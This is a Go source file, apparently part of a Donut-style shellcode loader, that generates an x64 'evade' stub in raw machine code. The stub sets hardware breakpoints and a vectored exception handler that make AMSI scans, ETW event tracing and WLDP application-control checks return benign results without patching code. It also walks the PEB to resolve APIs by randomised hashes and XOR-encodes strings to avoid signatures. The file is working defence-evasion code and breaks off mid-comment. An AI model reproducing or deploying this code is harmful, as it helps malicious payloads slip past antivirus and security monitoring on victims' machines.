package donut

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"
	"unicode/utf16"
)

/*
	Evade stub generators — patchless AMSI/WLDP/ETW interception for the
	position-independent loader stages.

	The emitted stub installs hardware-execution breakpoints (DR0-DR3) on the
	scan/notification functions and a Vectored Exception Handler that rewrites
	the faulting thread's CONTEXT to simulate an immediate, benign return from
	the intercepted function. No code page is ever modified: the stage stays
	valid under a PAGE_EXECUTE_READ handoff.

	Everything is raw machine code emitted at generation time — there is no
	compiler in the path, so per-build morph knobs (hash family and seed,
	DR-slot permutation, resolver register choice, iteration direction, junk
	density) vary the byte stream without any risk of optimizer folding.

	Handler design note: the VEH never embeds runtime addresses. A hardware
	execution breakpoint fault carries the target address in the very CONTEXT
	being inspected (Dr0..Dr3), so the handler compares Rip against those
	registers and selects the return semantics per slot. The stub is fully
	position-independent and stateless after installation.
*/

// EvadeMode selects which evasion path(s) run before the loader stage.
type EvadeMode int

const (
	// EvadeNone keeps the loader's built-in patch path (inst.Bypass semantics).
	EvadeNone EvadeMode = 0
	// EvadeHwbp installs DR breakpoints + VEH (patchless).
	EvadeHwbp EvadeMode = 1
	// P2 (EvadeCtx data-only sweeper) was dropped from v1.1.4 — first-scan
	// race and unsafe pointer sweeping outweighed its marginal telemetry
	// advantage. The mode set stays intentionally minimal: None or Hwbp.
)

// handling classes for intercepted slots
type evadeHandling byte

const (
	hcAmsiScan evadeHandling = iota // Rax = 0x80070057 (E_INVALIDARG), simulated return
	hcEtwVoid                       // Rax = 0 (STATUS_SUCCESS), simulated return
	hcWldp                          // Rax = 0 and second arg (Rdx) pointed BOOL = TRUE
)

// evadeHashFamily selects the emitted resolver hash loop.
type evadeHashFamily int

const (
	hashDJB evadeHashFamily = iota // h = h*31 + c
	hashFNV                        // h = (h ^ c) * 16777619
	hashROL                        // h = rol(h,13) + c
)

/*
	Go-side mirrors of the emitted hash loops. Both take the pre-lowercased
	input exactly as the machine code sees it:

	  - module names: lowercased, hashed as UTF-16LE bytes (two steps per unit)
	  - export names: exact case, hashed as NUL-terminated ASCII bytes
*/

func evadeHashWide(name string, family evadeHashFamily, seed uint32) uint32 {
	h := seed
	u := utf16.Encode([]rune(name))
	for _, c := range u {
		h = evadeHashStep(h, uint32(c&0xFF), family)
		h = evadeHashStep(h, uint32(c>>8), family)
	}
	return h
}

func evadeHashASCII(name string, family evadeHashFamily, seed uint32) uint32 {
	h := seed
	for i := 0; i < len(name); i++ {
		h = evadeHashStep(h, uint32(name[i]), family)
	}
	return h
}

func evadeHashStep(h, c uint32, family evadeHashFamily) uint32 {
	switch family {
	case hashDJB:
		return h*31 + c
	case hashFNV:
		return (h ^ c) * 16777619
	default:
		return (h<<13 | h>>(32-13)) + c
	}
}

func toLowerASCII(s string) string {
	b := []byte(s)
	for i := range b {
		if b[i] >= 'A' && b[i] <= 'Z' {
			b[i] += 0x20
		}
	}
	return string(b)
}

func evadeRandInt(n int) (int, error) {
	if n <= 0 {
		return 0, fmt.Errorf("evade: invalid random bound %d", n)
	}
	if n == 1 {
		return 0, nil
	}
	const maxAttempts = 128
	bound := uint64(n)
	threshold := -bound % bound
	var raw [8]byte
	for attempt := 0; attempt < maxAttempts; attempt++ {
		if _, err := io.ReadFull(rand.Reader, raw[:]); err != nil {
			return 0, fmt.Errorf("evade: random integer: %w", err)
		}
		value := binary.LittleEndian.Uint64(raw[:])
		if value < threshold {
			continue
		}
		return int(value % bound), nil
	}
	return 0, fmt.Errorf("evade: random source rejected %d samples", maxAttempts)
}

func evadeRandUint32() (uint32, error) {
	var b [4]byte
	if _, err := io.ReadFull(rand.Reader, b[:]); err != nil {
		return 0, err
	}
	return binary.LittleEndian.Uint32(b[:]), nil
}

// evadeShuffle returns a random permutation of [0,n).
func evadeShuffle(n int) ([]int, error) {
	p := make([]int, n)
	for i := range p {
		p[i] = i
	}
	for i := n - 1; i > 0; i-- {
		j, err := evadeRandInt(i + 1)
		if err != nil {
			return nil, err
		}
		p[i], p[j] = p[j], p[i]
	}
	return p, nil
}

/*
 ============================================================================
 x64 stub
 ============================================================================

Frame layout (rsp-relative, after prologue; rsp is 16-byte aligned):

	[rsp+0x00 .. +0x1F]  shadow space for the four API calls
	[rsp+0x20]           LoadLibraryA          (resolved once)
	[rsp+0x28]           GetThreadContext
	[rsp+0x30]           SetThreadContext
	[rsp+0x38]           RtlAddVectoredExceptionHandler
	[rsp+0x40]           amsi.dll base
	[rsp+0x48]           wldp.dll base
	[rsp+0x50 .. +0x6F]  resolved target addresses (4 x qword)
	[rsp+0x70 .. +0x8F]  stack-string scratch
	[rsp+0x90 .. +0x567] CONTEXT (0x4D8 bytes, 16-aligned)

Total sub = 0x570.

Saved registers (rbp-relative): rcx [rbp-0x08], rdx [rbp-0x10],
rbx [rbp-0x18], r12 [rbp-0x20], r13 [rbp-0x28], r14 [rbp-0x30],
r15 [rbp-0x38].

Working registers during the body: r12 module base (walk input), r13 walk
pointer, r14 name pointer, r15 hash accumulator, rbx result scratch,
rax/rcx/rdx/r8/r9/r10 volatile. rcx/rdx are restored before the final jmp,
so the x64 instance-pointer contract (rcx) survives the whole stub.
*/

const (
	evShadow   = 0x00
	evLoadLib  = 0x20
	evGetTC    = 0x28
	evSetTC    = 0x30
	evAddVEH   = 0x38
	evAmsiBase = 0x40
	evWldpBase = 0x48
	evTargets  = 0x50
	evStrings  = 0x70
	evCtx      = 0x90
	evFrame64  = 0x570

	ctx64Flags = 0x30
	ctx64Dr0   = 0x48
	ctx64Dr1   = 0x50
	ctx64Dr2   = 0x58
	ctx64Dr3   = 0x60
	ctx64Dr6   = 0x68
	ctx64Dr7   = 0x70
	ctx64Rdx   = 0x80
	ctx64Rax   = 0x78
	ctx64Rsp   = 0x98
	ctx64Rip   = 0xF8

	contextAMD64DebugRegs = 0x00100010 // CONTEXT_AMD64 | CONTEXT_DEBUG_REGISTERS
)

// EvadeTargets selects which interception families the evade stub arms.
// The zero value means "all" (backward compatible with v1.1.4 --evade hwbp);
// explicit bitmasks implement the v1.1.5 WP1-lite capability minimization:
// a .NET payload needs only EvadeAmsi (no wldp.dll force-load, no hot-path
// NtTraceEvent single-step density, 2 DR slots instead of 4).
type EvadeTargets uint8

const (
	EvadeAmsi EvadeTargets = 1 << iota
	EvadeEtw
	EvadeWldp
)

// All returns the full mask (backward-compatible default).
func (t EvadeTargets) All() EvadeTargets { return EvadeAmsi | EvadeEtw | EvadeWldp }

// options maps the mask onto generator options. The zero mask retains the
// backward-compatible "all families" behavior. Unknown bits are carried into
// the options so the generators can reject them without changing buildStage's
// private call contract.
func (t EvadeTargets) options() EvadeOptions {
	if t == 0 {
		t = t.All()
	}
	return EvadeOptions{
		Amsi:           t&EvadeAmsi != 0,
		Etw:            t&EvadeEtw != 0,
		Wldp:           t&EvadeWldp != 0,
		unknownTargets: t &^ t.All(),
	}
}

// EvadeOptions configures which intercepts the stub installs.
type EvadeOptions struct {
	Amsi bool // AmsiScanBuffer and AmsiScanString slots
	Etw  bool // NtTraceEvent slot (ETW telemetry suppression)
	Wldp bool // WldpIsClassInApprovedList slot

	unknownTargets EvadeTargets
}

// EvadeMetadata records what was generated, for tests and integration.
type EvadeMetadata struct {
	Arch          X64Arch
	Family        evadeHashFamily
	Seed          uint32
	SlotHandling  []evadeHandling // per DR slot 0..3; 0xFF marks unarmed
	SlotCount     int             // number of armed slots
	JmpOffset     int             // displacement field of the final jmp rel32
	FailJmpOffset int             // displacement field of the fail-path jmp rel32
	HandlerOffset int
	Size          int
}

// X64Arch is a tiny arch tag for metadata consumers.
type X64Arch int

// GenerateEvadeStub64 emits the complete x64 evade stub. The returned buffer
// ends with `jmp rel32` carrying a zero displacement that the artifact
// assembler must patch via PatchEvadeJmp once the following stage size is
// known.
func GenerateEvadeStub64(opts EvadeOptions) (stub []byte, meta EvadeMetadata, err error) {
	if opts.unknownTargets != 0 {
		return nil, meta, fmt.Errorf("evade: unknown target bits %#x", uint8(opts.unknownTargets))
	}
	if !opts.Amsi && !opts.Etw && !opts.Wldp {
		return nil, meta, fmt.Errorf("evade: no interception targets selected")
	}

	famInt, err := evadeRandInt(3)
	if err != nil {
		return nil, meta, err
	}
	family := evadeHashFamily(famInt)
	seed, err := evadeRandUint32()
	if err != nil {
		return nil, meta, err
	}
	if seed == 0 {
		seed = 0x9E3779B9
	}

	type tgt struct {
		name      string
		fromNtdll bool
		fromWldp  bool
		handling  evadeHandling
	}
	var targets []tgt
	if opts.Amsi {
		targets = append(targets,
			tgt{name: "AmsiScanBuffer", handling: hcAmsiScan},
			tgt{name: "AmsiScanString", handling: hcAmsiScan},
		)
	}
	if opts.Etw {
		targets = append(targets, tgt{name: "NtTraceEvent", fromNtdll: true, handling: hcEtwVoid})
	}
	if opts.Wldp {
		targets = append(targets, tgt{name: "WldpIsClassInApprovedList", fromWldp: true, handling: hcWldp})
	}
	if len(targets) > 4 {
		targets = targets[:4]
	}

	// Random DR-slot assignment (permutation of targets over DR0..DR3).
	perm, err := evadeShuffle(len(targets))
	if err != nil {
		return nil, meta, err
	}
	slotHandling := make([]evadeHandling, 4)
	for i := range slotHandling {
		slotHandling[i] = 0xFF // unarmed marker
	}
	for dr := 0; dr < len(perm); dr++ {
		slotHandling[dr] = targets[perm[dr]].handling
	}

	meta = EvadeMetadata{
		Arch:         1,
		Family:       family,
		Seed:         seed,
		SlotHandling: slotHandling,
		SlotCount:    len(targets),
	}

	var b bytes.Buffer
	var failFixups []int // rel32 displacement fields of `jmp fail` to patch

	// ---------- prologue ----------
	b.Write([]byte{0x55})                                     // push rbp
	b.Write([]byte{0x48, 0x89, 0xE5})                         // mov rbp, rsp
	b.Write([]byte{0x51})                                     // push rcx   [rbp-0x08]
	b.Write([]byte{0x52})                                     // push rdx   [rbp-0x10]
	b.Write([]byte{0x53})                                     // push rbx   [rbp-0x18]
	b.Write([]byte{0x41, 0x54})                               // push r12   [rbp-0x20]
	b.Write([]byte{0x41, 0x55})                               // push r13   [rbp-0x28]
	b.Write([]byte{0x41, 0x56})                               // push r14   [rbp-0x30]
	b.Write([]byte{0x41, 0x57})                               // push r15   [rbp-0x38]
	b.Write([]byte{0x48, 0x83, 0xE4, 0xF0})                   // and rsp, -16
	b.Write([]byte{0x48, 0x81, 0xEC, 0x70, 0x05, 0x00, 0x00}) // sub rsp, 0x570

	// ---------- resolve module bases ----------
	if err := emitModuleBase64(&b, family, seed, "ntdll.dll", regR12, &failFixups); err != nil {
		return nil, meta, err
	}
	// ntdll!RtlAddVectoredExceptionHandler -> [rsp+0x38]
	if err := emitExportResolve64(&b, family, seed, "RtlAddVectoredExceptionHandler", regR12, &failFixups); err != nil {
		return nil, meta, err
	}
	b.Write([]byte{0x48, 0x89, 0x5C, 0x24, evAddVEH}) // mov [rsp+0x38], rbx
	// Preserve the ntdll base in NtTraceEvent's eventual target slot. The slot
	// is overwritten with the resolved function address below.
	for i, target := range targets {
		if target.fromNtdll {
			b.Write([]byte{0x4C, 0x89, 0xA4, 0x24}) // mov [rsp+disp32], r12
			binary.Write(&b, binary.LittleEndian, uint32(evTargets+8*i))
		}
	}

	if err := emitModuleBase64(&b, family, seed, "kernel32.dll", regR12, &failFixups); err != nil {
		return nil, meta, err
	}
	// kernel32!LoadLibraryA / GetThreadContext / SetThreadContext
	if err := emitExportResolve64(&b, family, seed, "LoadLibraryA", regR12, &failFixups); err != nil {
		return nil, meta, err
	}
	b.Write([]byte{0x48, 0x89, 0x5C, 0x24, evLoadLib}) // mov [rsp+0x20], rbx
	if err := emitExportResolve64(&b, family, seed, "GetThreadContext", regR12, &failFixups); err != nil {
		return nil, meta, err
	}
	b.Write([]byte{0x48, 0x89, 0x5C, 0x24, evGetTC}) // mov [rsp+0x28], rbx
	if err := emitExportResolve64(&b, family, seed, "SetThreadContext", regR12, &failFixups); err != nil {
		return nil, meta, err
	}
	b.Write([]byte{0x48, 0x89, 0x5C, 0x24, evSetTC}) // mov [rsp+0x30], rbx

	// ---------- force-load selected target modules ----------
	if opts.Amsi {
		if err := emitLoadLibraryCall64(&b, family, "", "amsi.dll"); err != nil {
			return nil, meta, err
		}
		emitRuntimeFailureCheck64(&b, true, &failFixups)
		b.Write([]byte{0x48, 0x89, 0x44, 0x24, evAmsiBase}) // mov [rsp+0x40], rax
	}
	if opts.Wldp {
		if err := emitLoadLibraryCall64(&b, family, "", "wldp.dll"); err != nil {
			return nil, meta, err
		}
		emitRuntimeFailureCheck64(&b, true, &failFixups)
		b.Write([]byte{0x48, 0x89, 0x44, 0x24, evWldpBase}) // mov [rsp+0x48], rax
	}

	// ---------- resolve target functions ----------
	for i, t := range targets {
		slotReg := evAmsiBase
		if t.fromNtdll {
			slotReg = evTargets + 8*i
		} else if t.fromWldp {
			slotReg = evWldpBase
		}
		// mov r12, [rsp+slot]
		b.Write([]byte{0x4C, 0x8B, 0xA4, 0x24})
		binary.Write(&b, binary.LittleEndian, uint32(slotReg))
		if err := emitExportResolve64(&b, family, seed, t.name, regR12, &failFixups); err != nil {
			return nil, meta, err
		}
		// mov [rsp+evTargets+8i], rbx
		b.Write([]byte{0x48, 0x89, 0x9C, 0x24})
		binary.Write(&b, binary.LittleEndian, uint32(evTargets+8*i))
	}

	// ---------- GetThreadContext(-2, ctx) ----------
	// ContextFlags first (in/out field)
	b.Write([]byte{0xC7, 0x84, 0x24}) // mov dword [rsp+evCtx+0x30], imm32
	binary.Write(&b, binary.LittleEndian, uint32(evCtx+ctx64Flags))
	binary.Write(&b, binary.LittleEndian, uint32(contextAMD64DebugRegs))
	b.Write([]byte{0x48, 0xC7, 0xC1, 0xFE, 0xFF, 0xFF, 0xFF}) // mov rcx, -2
	b.Write([]byte{0x48, 0x8D, 0x94, 0x24})                   // lea rdx, [rsp+evCtx]
	binary.Write(&b, binary.LittleEndian, uint32(evCtx))
	b.Write([]byte{0xFF, 0x54, 0x24, evGetTC}) // call [rsp+0x28]
	emitRuntimeFailureCheck64(&b, false, &failFixups)

	// ---------- arm DR slots ----------
	dr7 := uint32(0)
	drOffsets := []uint32{ctx64Dr0, ctx64Dr1, ctx64Dr2, ctx64Dr3}
	for dr := 0; dr < len(perm); dr++ {
		// mov rax, [rsp+evTargets+8*perm[dr]]
		b.Write([]byte{0x48, 0x8B, 0x84, 0x24})
		binary.Write(&b, binary.LittleEndian, uint32(evTargets+8*perm[dr]))
		// mov [rsp+evCtx+drOffset], rax
		b.Write([]byte{0x48, 0x89, 0x84, 0x24})
		binary.Write(&b, binary.LittleEndian, uint32(evCtx+drOffsets[dr]))
		dr7 |= 1 << uint(2*dr) // local enable, RW=00 execute, LEN=00
	}
	b.Write([]byte{0xC7, 0x84, 0x24}) // mov dword [rsp+evCtx+Dr7], dr7
	binary.Write(&b, binary.LittleEndian, uint32(evCtx+ctx64Dr7))
	binary.Write(&b, binary.LittleEndian, dr7)

	// ---------- RtlAddVectoredExceptionHandler(1, handler) — FIRST, before any
	// DR is armed, so there is no unhandled-breakpoint window (sol review R2).
	leaPos := b.Len()
	b.Write([]byte{0x48, 0x8D, 0x15, 0, 0, 0, 0}) // lea rdx, [rip+disp32] (patched)
	b.Write([]byte{0xB9, 0x01, 0x00, 0x00, 0x00}) // mov ecx, 1
	b.Write([]byte{0xFF, 0x54, 0x24, evAddVEH})   // call [rsp+0x38]
	// A NULL registration result must branch away before SetThreadContext can
	// apply DR state; otherwise the first breakpoint would be unhandled.
	emitRuntimeFailureCheck64(&b, true, &failFixups)

	// ---------- SetThreadContext(-2, ctx) — after VEH registration ----------
	b.Write([]byte{0x48, 0xC7, 0xC1, 0xFE, 0xFF, 0xFF, 0xFF}) // mov rcx, -2
	b.Write([]byte{0x48, 0x8D, 0x94, 0x24})                   // lea rdx, [rsp+evCtx]
	binary.Write(&b, binary.LittleEndian, uint32(evCtx))
	b.Write([]byte{0xFF, 0x54, 0x24, evSetTC}) // call [rsp+0x30]
	emitRuntimeFailureCheck64(&b, false, &failFixups)

	// ---------- epilogue ----------
	b.Write([]byte{0x48, 0x8B, 0x4D, 0xF8}) // mov rcx, [rbp-0x08]
	b.Write([]byte{0x48, 0x8B, 0x55, 0xF0}) // mov rdx, [rbp-0x10]
	b.Write([]byte{0x48, 0x8B, 0x5D, 0xE8}) // mov rbx, [rbp-0x18]
	b.Write([]byte{0x4C, 0x8B, 0x65, 0xE0}) // mov r12, [rbp-0x20]
	b.Write([]byte{0x4C, 0x8B, 0x6D, 0xD8}) // mov r13, [rbp-0x28]
	b.Write([]byte{0x4C, 0x8B, 0x75, 0xD0}) // mov r14, [rbp-0x30]
	b.Write([]byte{0x4C, 0x8B, 0x7D, 0xC8}) // mov r15, [rbp-0x38]
	b.Write([]byte{0x48, 0x89, 0xEC})       // mov rsp, rbp
	b.Write([]byte{0x5D})                   // pop rbp
	jmpPos := b.Len()
	b.Write([]byte{0xE9, 0, 0, 0, 0}) // jmp rel32 (patched by assembler)
	meta.JmpOffset = jmpPos + 1

	// ---------- resolve-failure trampoline (fail label) ----------
	failPos := b.Len()
	// Degrade to a no-op pass-through: restore everything and jump onward.
	b.Write([]byte{0x48, 0x8B, 0x4D, 0xF8}) // mov rcx, [rbp-0x08]
	b.Write([]byte{0x48, 0x8B, 0x55, 0xF0}) // mov rdx, [rbp-0x10]
	b.Write([]byte{0x48, 0x8B, 0x5D, 0xE8}) // mov rbx, [rbp-0x18]
	b.Write([]byte{0x4C, 0x8B, 0x65, 0xE0}) // mov r12, [rbp-0x20]
	b.Write([]byte{0x4C, 0x8B, 0x6D, 0xD8}) // mov r13, [rbp-0x28]
	b.Write([]byte{0x4C, 0x8B, 0x75, 0xD0}) // mov r14, [rbp-0x30]
	b.Write([]byte{0x4C, 0x8B, 0x7D, 0xC8}) // mov r15, [rbp-0x38]
	b.Write([]byte{0x48, 0x89, 0xEC})       // mov rsp, rbp
	b.Write([]byte{0x5D})                   // pop rbp
	b.Write([]byte{0xE9, 0, 0, 0, 0})       // jmp rel32 (same target as main exit)
	// patch all fail jumps recorded by the resolvers
	for _, fx := range failFixups {
		disp := int32(failPos - (fx + 4))
		binary.LittleEndian.PutUint32(b.Bytes()[fx:fx+4], uint32(disp))
	}
	meta.FailJmpOffset = b.Len() - 4

	// ---------- VEH handler ----------
	handlerPos := b.Len()
	// patch the lea rdx displacement (rip = leaPos+7)
	binary.LittleEndian.PutUint32(b.Bytes()[leaPos+3:leaPos+7], uint32(handlerPos-(leaPos+7)))
	if err := emitHandler64(&b, slotHandling); err != nil {
		return nil, meta, err
	}
	meta.HandlerOffset = handlerPos

	meta.Size = b.Len()
	stub = append([]byte(nil), b.Bytes()...)
	return stub, meta, nil
}

// emitRuntimeFailureCheck64 branches to the shared restore path when a setup
// API reports failure. Pointer-returning APIs are checked as 64-bit values;
// BOOL-returning APIs are checked through eax.
func emitRuntimeFailureCheck64(b *bytes.Buffer, pointerResult bool, failFixups *[]int) {
	if pointerResult {
		b.Write([]byte{0x48, 0x85, 0xC0}) // test rax, rax
	} else {
		b.Write([]byte{0x85, 0xC0}) // test eax, eax
	}
	b.Write([]byte{0x0F, 0x84}) // jz fail (rel32, patched)
	field := b.Len()
	binary.Write(b, binary.LittleEndian, uint32(0))
	*failFixups = append(*failFixups, field)
}

// emitModuleBase64 walks the PEB InMemoryOrderModuleList hashing each
// module's lowercased UTF-16LE BaseDllName against the family constant and
// leaves the DllBase in the destination register.
//
// Register use: rax = link pointer, r13 = name pointer, r14 = byte counter,
// r15 = hash accumulator, rdx = scratch. r12 is NOT touched (input base reg
// must persist), so the destination must be r12 for our call pattern.
func emitModuleBase64(b *bytes.Buffer, family evadeHashFamily, seed uint32, module string, dst byte, failFixups *[]int) error {
	if dst != regR12 {
		return fmt.Errorf("evade: x64 module walk requires r12 destination")
	}
	want := evadeHashWide(toLowerASCII(module), family, seed)

	b.Write([]byte{0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00}) // mov rax, gs:[0x60]
	b.Write([]byte{0x48, 0x8B, 0x40, 0x18})                               // mov rax, [rax+0x18]  PEB->Ldr
	// rbx = &Ldr->InMemoryOrderModuleList (the circular LIST HEAD). The walk
	// compares each link against rbx and stops there — hashing the head as if
	// it were an entry reads Ldr+0x68/+0x70 (garbage pointer/length) and was
	// the F1 qualification fault. rbx is free during the module walk in both
	// the evade stub and the trampoline (callee-saved by their prologues).
	b.Write([]byte{0x48, 0x8D, 0x58, 0x20}) // lea rbx, [rax+0x20]  &head
	b.Write([]byte{0x48, 0x8B, 0x40, 0x20}) // mov rax, [rax+0x20]  first entry link

	walkTop := b.Len()
	// wrapped back to the head without a match -> resolve failure
	b.Write([]byte{0x48, 0x39, 0xD8}) // cmp rax, rbx
	b.Write([]byte{0x0F, 0x84})       // je fail (rel32, patched)
	jeWrapPos := b.Len()              // displacement field — AFTER the opcode bytes
	binary.Write(b, binary.LittleEndian, uint32(0))
	*failFixups = append(*failFixups, jeWrapPos)

	b.Write([]byte{0x4C, 0x8B, 0x68, 0x50})       // mov r13, [rax+0x50]  BaseDllName.Buffer (link+0x50)
	b.Write([]byte{0x44, 0x0F, 0xB7, 0x70, 0x48}) // movzx r14d, word [rax+0x48] BaseDllName.Length — USHORT field, a DWORD read smears MaximumLength into the counter (daybreak F-1)
	b.Write([]byte{0x41, 0xBF})                   // mov r15d, imm32 (per-entry seed reset)
	binary.Write(b, binary.LittleEndian, seed)

	hashTop := b.Len()
	b.Write([]byte{0x45, 0x85, 0xF6}) // test r14d, r14d
	var jzHashDone int
	b.WriteByte(0x74)
	jzHashDone = b.Len()
	b.WriteByte(0x00)
	// lowercase low byte in dl — [r13] needs mod=01 disp8=0 (rm=101 mod=00 is RIP-relative)
	b.Write([]byte{0x41, 0x0F, 0xB6, 0x55, 0x00}) // movzx edx, byte [r13+0]
	var jl1, jg1 int
	b.Write([]byte{0x80, 0xFA, 0x41}) // cmp dl, 'A'
	b.WriteByte(0x7C)
	jl1 = b.Len()
	b.WriteByte(0x00)
	b.Write([]byte{0x80, 0xFA, 0x5A}) // cmp dl, 'Z'
	b.WriteByte(0x7F)
	jg1 = b.Len()
	b.WriteByte(0x00)
	b.Write([]byte{0x80, 0xC2, 0x20}) // add dl, 0x20
	lcDone := b.Len()
	b.Bytes()[jl1] = byte(lcDone - (jl1 + 1))
	b.Bytes()[jg1] = byte(lcDone - (jg1 + 1))
	// family step over dl
	if err := emitHashStep64(b, family); err != nil {
		return err
	}
	b.Write([]byte{0x49, 0xFF, 0xC5}) // inc r13
	b.Write([]byte{0x49, 0xFF, 0xCE}) // dec r14
	var jmpHash int
	b.WriteByte(0xEB)
	jmpHash = b.Len()
	b.WriteByte(0x00)
	hashDone := b.Len()
	b.Bytes()[jzHashDone] = byte(hashDone - (jzHashDone + 1))
	b.Bytes()[jmpHash] = byte(hashTop - (jmpHash + 1))

	// compare with wanted constant
	b.Write([]byte{0x41, 0x81, 0xFF}) // cmp r15d, imm32
	binary.Write(b, binary.LittleEndian, want)
	var jeFound int
	b.WriteByte(0x74)
	jeFound = b.Len()
	b.WriteByte(0x00)
	// next link (head-wrap termination is checked at walkTop against rbx)
	b.Write([]byte{0x48, 0x8B, 0x00}) // mov rax, [rax]
	var jmpWalk int
	b.WriteByte(0xEB)
	jmpWalk = b.Len()
	b.WriteByte(0x00)
	found := b.Len()
	b.Bytes()[jeFound] = byte(found - (jeFound + 1))
	b.Bytes()[jmpWalk] = byte(walkTop - (jmpWalk + 1))
	// DllBase = [rax+0x20] (link+0x20 = entry+0x30)
	b.Write([]byte{0x4C, 0x8B, 0x60, 0x20}) // mov r12, [rax+0x20]
	return nil
}

// emitHashStep64 advances r15d over dl for the chosen family.
func emitHashStep64(b *bytes.Buffer, family evadeHashFamily) error {
	switch family {
	case hashDJB:
		// r15 = r15*31 + rdx(zero-extended? we use edx paths) — we hashed dl;
		// mirror Go: h = h*31 + c where c = lowercased byte value (0-255).
		// movzx edx above set full edx. use: imul r15d, r15d, 31 ; add r15d, edx
		b.Write([]byte{0x45, 0x6B, 0xFF, 0x1F}) // imul r15d, r15d, 31
		b.Write([]byte{0x41, 0x01, 0xD7})       // add r15d, edx
	case hashFNV:
		b.Write([]byte{0x41, 0x31, 0xD7})                         // xor r15d, edx
		b.Write([]byte{0x45, 0x69, 0xFF, 0x93, 0x01, 0x00, 0x01}) // imul r15d, r15d, 0x01000193
	case hashROL:
		b.Write([]byte{0x41, 0xC1, 0xC7, 0x0D}) // rol r15d, 13
		b.Write([]byte{0x41, 0x01, 0xD7})       // add r15d, edx
	default:
		return fmt.Errorf("evade: unknown hash family %d", family)
	}
	return nil
}

/*
emitExportResolve64 resolves an exact-case export name from the module
base held in r12 and leaves the function address in rbx.

Register use: rax = export dir, rcx = name index, r8 = AddressOfNames,
r9 = AddressOfFunctions, r10 = AddressOfNameOrdinals, r13 = name ptr,
r14 = byte counter, r15 = hash accumulator, rdx = scratch.

On failure (hash not found after all names) it jumps to the stub's fail
label via a recorded rel32 fixup.
*/
func emitExportResolve64(b *bytes.Buffer, family evadeHashFamily, seed uint32, name string, baseReg byte, failFixups *[]int) error {
	if baseReg != regR12 {
		return fmt.Errorf("evade: x64 export resolve requires r12 base")
	}
	want := evadeHashASCII(name, family, seed)

	b.Write([]byte{0x41, 0x8B, 0x44, 0x24, 0x3C}) // mov eax, [r12+0x3C]  e_lfanew
	b.Write([]byte{0x49, 0x01, 0xC4})             // add r12, rax  — NO: this destroys the base for later resolves.
	b.Truncate(b.Len() - 3)
	// keep base intact: use rax-relative arithmetic in scratch r11
	b.Write([]byte{0x4C, 0x89, 0xE3})                         // mov rbx, r12 (base copy)
	b.Write([]byte{0x48, 0x01, 0xD8})                         // add rax, rbx  NT headers
	b.Write([]byte{0x8B, 0x80, 0x88, 0x00, 0x00, 0x00})       // mov eax, [rax+0x88] export RVA — DWORD field, zero-extends (a QWORD read smears the Size dword in, daybreak F-2)
	b.Write([]byte{0x48, 0x01, 0xD8})                         // add rax, rbx  export dir
	b.Write([]byte{0x8B, 0x48, 0x18})                         // mov ecx, [rax+0x18] NumberOfNames
	b.Write([]byte{0x44, 0x8B, 0x88, 0x20, 0x00, 0x00, 0x00}) // mov r9d, [rax+0x20] AddressOfNames RVA (daybreak F-3: lea computed the field ADDRESS, not its value)
	b.Write([]byte{0x44, 0x8B, 0x50, 0x1C})                   // mov r10d, [rax+0x1C] AddressOfFunctions RVA
	b.Write([]byte{0x44, 0x8B, 0x58, 0x24})                   // mov r11d, [rax+0x24] AddressOfNameOrdinals RVA
	// relocate absolute tables: r9/r10/r11 are RVAs → add base
	b.Write([]byte{0x49, 0x01, 0xD9}) // add r9,  rbx
	b.Write([]byte{0x49, 0x01, 0xDA}) // add r10, rbx
	b.Write([]byte{0x49, 0x01, 0xDB}) // add r11, rbx

	nameTop := b.Len()
	b.Write([]byte{0x85, 0xC9}) // test ecx, ecx
	var jzFail int
	b.WriteByte(0x0F)
	b.WriteByte(0x84)
	jzFail = b.Len()
	binary.Write(b, binary.LittleEndian, uint32(0))
	b.Write([]byte{0xFF, 0xC9})             // dec ecx
	b.Write([]byte{0x45, 0x8B, 0x2C, 0x89}) // mov r13d, [r9+rcx*4] name RVA — DWORD entries at scale 4 (daybreak F-4: QWORD/scale-8 read garbage)
	b.Write([]byte{0x49, 0x01, 0xDD})       // add r13, rbx name ptr (REX.R+B: reg=rbx rm=r13)
	b.Write([]byte{0x41, 0xBF})             // mov r15d, seed
	binary.Write(b, binary.LittleEndian, seed)

	ascTop := b.Len()
	b.Write([]byte{0x41, 0x0F, 0xB6, 0x55, 0x00}) // movzx edx, byte [r13+0]
	b.Write([]byte{0x84, 0xD2})                   // test dl, dl
	var jzADone int
	b.WriteByte(0x74)
	jzADone = b.Len()
	b.WriteByte(0x00)
	if err := emitHashStep64(b, family); err != nil {
		return err
	}
	b.Write([]byte{0x49, 0xFF, 0xC5}) // inc r13
	var jmpA int
	b.WriteByte(0xEB)
	jmpA = b.Len()
	b.WriteByte(0x00)
	aDone := b.Len()
	b.Bytes()[jzADone] = byte(aDone - (jzADone + 1))
	b.Bytes()[jmpA] = byte(ascTop - (jmpA + 1))

	b.Write([]byte{0x41, 0x81, 0xFF}) // cmp r15d, want
	binary.Write(b, binary.LittleEndian, want)
	var jneNext int
	b.WriteByte(0x75)
	jneNext = b.Len()
	b.WriteByte(0x00)
	// found: ordinal = word [r11+rcx*2]; addr = [r10+ordinal*4] + rbx
	b.Write([]byte{0x45, 0x0F, 0xB7, 0x1C, 0x4B}) // movzx r11d, word [r11+rcx*2] (SIB scale=01 *2)
	b.Write([]byte{0x43, 0x8B, 0x04, 0x9A})       // mov eax, [r10+r11*4]  (REX X+B: idx r11, base r10)
	var jmpOut int
	b.WriteByte(0xEB)
	jmpOut = b.Len()
	b.WriteByte(0x00)
	nextName := b.Len()
	b.Bytes()[jneNext] = byte(nextName - (jneNext + 1))
	var jmpNameTop int
	b.WriteByte(0xEB)
	jmpNameTop = b.Len()
	b.WriteByte(0x00)
	b.Bytes()[jmpNameTop] = byte(nameTop - (jmpNameTop + 1))

	outDone := b.Len()
	b.Bytes()[jmpOut] = byte(outDone - (jmpOut + 1))
	b.Write([]byte{0x48, 0x01, 0xD8}) // add rax, rbx
	b.Write([]byte{0x48, 0x89, 0xC3}) // mov rbx, rax
	// patch jzFail rel32 → caller's fail label (recorded)
	*failFixups = append(*failFixups, jzFail)
	return nil
}

// emitLoadLibraryCall64 writes an ENCODED stack string at [rsp+evStrings],
// decodes it in place with a per-build rolling XOR, then calls LoadLibraryA
// from [rsp+evLoadLib]. Encoding: enc[i] = plain[i] ^ ((key + i*delta) & 0xFF)
// — the plaintext module name never appears in the emitted bytes (ghost
